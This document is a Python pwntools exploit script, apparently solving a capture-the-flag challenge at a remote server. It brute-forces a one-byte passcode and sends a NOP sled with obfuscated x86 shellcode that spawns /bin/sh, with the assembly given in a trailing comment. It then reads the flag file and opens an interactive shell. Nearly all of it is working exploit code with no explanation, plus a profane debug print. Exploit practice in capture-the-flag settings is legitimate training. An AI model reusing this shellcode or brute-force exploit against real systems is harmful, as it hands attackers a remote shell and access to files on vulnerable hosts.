from pwn import *

counter = 0

while 1:
    try:
        # p = process('./ANALYZER')
        p = remote('ctf.adl.tw', 11005)
        print(f'fuck * {counter}')
        counter+=1
        p.sendafter('passcode:', b'\x90'*0x10+bytes([counter%(0xff+1)]))
        shellcode = '\x90'*44+'\x31\xC0\x99\x50\xB9\x2E\x2E\x72\x67\x81\xC1\x01\x01\x01\x01\x51\xB9\x2E\x61\x68\x6D\x81\xC1\x01\x01\x01\x01\x51\x89\xE3\x50\x53\x89\xE1\xB0\x0B\x31\xFF\xBF\xBD\x70\x00\x00\x81\xC7\x10\x10\x00\x00\x57\xFF\xD4'
        p.sendafter('format:', shellcode)
        p.recvuntil('result...\n')
        p.sendline('cat /home/`whoami`/flag')
        print(p.recv())
        break
    except:
        p.close()
p.interactive()

'''
xor eax,eax
cdq
push eax
mov ecx, 0x67722e2e
add ecx, 0x01010101
push ecx
mov ecx, 0x6d68612e
add ecx, 0x01010101
push ecx
mov ebx,esp
push eax
push ebx
mov ecx, esp
mov al,0x0b
xor edi, edi
mov edi, 0x70bd
add edi, 0x1010
push edi
call esp
'''
